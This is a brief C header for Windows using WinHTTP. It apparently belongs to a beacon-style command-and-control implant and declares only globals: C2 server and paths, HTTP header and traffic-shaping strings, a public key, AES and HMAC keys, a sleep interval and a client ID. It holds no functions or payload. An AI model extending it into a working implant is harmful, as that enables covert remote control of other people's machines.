#pragma once
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

unsigned char* metadata_prepend;
unsigned char* metadata_header;
extern const char Http_Post_uri[];
const wchar_t* server;
const wchar_t* get_path;
const wchar_t* post_path;
INTERNET_PORT port;
const wchar_t* host_header;
const wchar_t* user_agent_header;
const wchar_t* server_header;
const wchar_t* content_type_header;
unsigned char* Http_post_id_prepend;
unsigned char* Http_post_id_append;
unsigned char* Http_post_client_output_prepend;
unsigned char* Http_post_client_output_append;
extern unsigned char* pub_key_str;
unsigned char* Response_prepend;
unsigned char* Response_append;
unsigned char IV[];
int SleepTime;
unsigned char AESRandaeskey[16];
unsigned char Hmackey[16];
int Counter;
int clientID;
